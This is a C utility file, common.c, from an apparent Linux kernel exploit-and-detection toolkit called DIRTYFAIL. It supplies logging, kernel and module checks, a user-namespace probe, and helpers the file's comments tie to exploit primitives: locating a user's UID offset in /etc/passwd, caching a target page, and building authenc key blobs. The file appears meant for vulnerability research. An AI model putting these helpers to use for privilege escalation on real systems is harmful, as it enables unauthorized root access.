/*
 * DIRTYFAIL — common.c
 *
 * Tiny utility surface shared by the detectors and exploiters. Nothing
 * here is CVE-specific — that lives in copyfail.c, dirtyfrag_esp.c and
 * dirtyfrag_rxrpc.c.
 */

#include "common.h"

#include <ctype.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <pwd.h>
#ifdef __linux__
#include <sys/syscall.h>
#endif

/* On glibc <sched.h>+_GNU_SOURCE provides these. macOS lacks them; we
 * still want this file to parse under macOS clang for static analysis,
 * so the unprivileged_userns_allowed body itself is platform-guarded. */
#ifndef CLONE_NEWUSER
#define CLONE_NEWUSER 0x10000000
#endif

bool dirtyfail_use_color = true;

static void vlog(FILE *out, const char *prefix, const char *color,
                 const char *fmt, va_list ap)
{
    if (dirtyfail_use_color && color)
        fprintf(out, "\033[%sm%s\033[0m ", color, prefix);
    else
        fprintf(out, "%s ", prefix);
    vfprintf(out, fmt, ap);
    fputc('\n', out);
}

#define LOG_FN(name, prefix, color, stream)                                 \
    void name(const char *fmt, ...) {                                       \
        va_list ap; va_start(ap, fmt);                                      \
        vlog(stream, prefix, color, fmt, ap);                               \
        va_end(ap);                                                         \
    }

LOG_FN(log_step, "[*]", "1;36", stdout)   /* cyan  */
LOG_FN(log_ok,   "[+]", "1;32", stdout)   /* green */
LOG_FN(log_bad,  "[-]", "1;31", stderr)   /* red   */
LOG_FN(log_warn, "[!]", "1;33", stderr)   /* yellow*/
LOG_FN(log_hint, "[i]", "0;37", stdout)   /* dim   */

/* ------------------------------------------------------------------ */

bool kernel_version(int *major, int *minor)
{
    struct utsname u;
    if (uname(&u) != 0) return false;
    /* release looks like "6.12.0-124.49.1.el10_1.x86_64" — split on dots. */
    char *dot1 = strchr(u.release, '.');
    if (!dot1) return false;
    *dot1 = '\0';
    *major = atoi(u.release);
    char *dot2 = strchr(dot1 + 1, '.');
    if (dot2) *dot2 = '\0';
    *minor = atoi(dot1 + 1);
    return true;
}

bool kmod_loaded(const char *name)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return false;
    char line[512];
    size_t nlen = strlen(name);
    bool found = false;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, name, nlen) == 0 && line[nlen] == ' ') {
            found = true;
            break;
        }
    }
    fclose(f);
    return found;
}

/* Probe by spawning a child. Doing it inline would either succeed (and
 * leave us in a fresh userns for the rest of the run, breaking later
 * checks) or fail and leave errno polluted. The fork is cheap enough.
 *
 * We use syscall(SYS_unshare) rather than the libc wrapper so this
 * compiles on toolchains where <sched.h> doesn't expose unshare(). */
bool unprivileged_userns_allowed(void)
{
#ifdef __linux__
    pid_t pid = fork();
    if (pid < 0) return false;
    if (pid == 0) {
        if (syscall(SYS_unshare, CLONE_NEWUSER) == 0) _exit(0);
        _exit(1);
    }
    int wstatus = 0;
    waitpid(pid, &wstatus, 0);
    return WIFEXITED(wstatus) && WEXITSTATUS(wstatus) == 0;
#else
    return false;  /* macOS analysis path — never executed in production */
#endif
}

bool find_passwd_uid_field(const char *username,
                           off_t *uid_off, size_t *uid_len,
                           char *uid_str)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return false;

    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return false; }

    char *buf = malloc(st.st_size + 1);
    if (!buf) { close(fd); return false; }
    ssize_t got = read(fd, buf, st.st_size);
    close(fd);
    if (got <= 0) { free(buf); return false; }
    buf[got] = '\0';

    bool found = false;
    size_t ulen = strlen(username);
    char *line = buf;
    while (line < buf + got) {
        if (strncmp(line, username, ulen) == 0 && line[ulen] == ':') {
            /* user:x:UID:GID:... — skip 2 colons to land on UID start. */
            char *p = line + ulen + 1;
            char *colon = strchr(p, ':');
            if (!colon) break;
            char *uid_start = colon + 1;
            char *uid_end   = strchr(uid_start, ':');
            if (!uid_end) break;
            size_t len = uid_end - uid_start;
            if (len >= 16) break;
            *uid_off = uid_start - buf;
            *uid_len = len;
            memcpy(uid_str, uid_start, len);
            uid_str[len] = '\0';
            found = true;
            break;
        }
        char *nl = strchr(line, '\n');
        if (!nl) break;
        line = nl + 1;
    }
    free(buf);
    return found;
}

bool drop_caches(void)
{
    int fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (fd < 0) return false;
    ssize_t n = write(fd, "3\n", 2);
    close(fd);
    return n == 2;
}

void hex_dump(const unsigned char *buf, size_t len)
{
    for (size_t i = 0; i < len; i += 16) {
        printf("    %04zx  ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < len) printf("%02x ", buf[i + j]);
            else             printf("   ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            unsigned char c = buf[i + j];
            putchar(isprint(c) ? c : '.');
        }
        printf("|\n");
    }
}

/*
 * authenc keyblob layout (see crypto/authenc.c::crypto_authenc_setkey):
 *
 *   struct rtattr { __u16 rta_len; __u16 rta_type; }   = 4 bytes
 *   __be32 enckeylen                                   = 4 bytes
 *   authkey[authkeylen]
 *   enckey [enckeylen]
 *
 * rta_len in the rtattr counts the rtattr header *plus* the enckeylen
 * field, so it is always 8.
 */
size_t build_authenc_keyblob(unsigned char *out,
                             const unsigned char *authkey, size_t authkeylen,
                             const unsigned char *enckey,  size_t enckeylen)
{
    /* struct rtattr { u16 rta_len; u16 rta_type; } */
    out[0] = 8;     out[1] = 0;
    out[2] = CRYPTO_AUTHENC_KEYA_PARAM;
    out[3] = 0;
    /* __be32 enckeylen */
    out[4] = (enckeylen >> 24) & 0xff;
    out[5] = (enckeylen >> 16) & 0xff;
    out[6] = (enckeylen >>  8) & 0xff;
    out[7] = (enckeylen      ) & 0xff;
    memcpy(out + 8,                  authkey, authkeylen);
    memcpy(out + 8 + authkeylen,     enckey,  enckeylen);
    return 8 + authkeylen + enckeylen;
}

bool typed_confirm(const char *expected)
{
    char buf[128];
    printf("    Type \033[1;33m%s\033[0m and press enter to proceed: ", expected);
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin)) return false;
    /* strip trailing newline */
    size_t n = strlen(buf);
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r')) buf[--n] = '\0';
    return strcmp(buf, expected) == 0;
}

int open_and_cache(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    /* Force a read so the page is in the cache. The exploit primitives
     * all assume the target page is already populated. */
    char tmp[4096];
    (void)read(fd, tmp, sizeof(tmp));
    lseek(fd, 0, SEEK_SET);
    return fd;
}
